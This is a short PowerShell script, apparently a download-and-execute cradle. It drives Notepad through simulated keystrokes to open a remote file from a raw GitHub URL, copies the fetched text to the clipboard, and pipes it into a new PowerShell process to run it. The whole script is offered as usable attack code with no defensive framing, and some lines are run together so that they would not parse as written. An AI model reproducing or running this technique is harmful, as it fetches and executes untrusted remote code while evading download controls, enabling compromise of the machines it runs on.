$wshell= New-Object -ComObjectwscript.shell 
$wshell.run("notepad") 
$wshell.AppActivate('Untitled -Notepad') 
Start-Sleep 2 $wshell.SendKeys('^o') 
Start-Sleep 2 $wshell.SendKeys('https://raw.githubusercontent.com/msffluffybunnies/rabbithole/master/test.txt') 
$wshell.SendKeys('~') Start-Sleep 5 
$wshell.SendKeys('^a') 
$wshell.SendKeys('^c') 
# Execute contents in clipboard back in PowerShell process 
[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') 
$clipboardContents= [System.Windows.Forms.Clipboard]::GetText() 
$clipboardContents| powershell -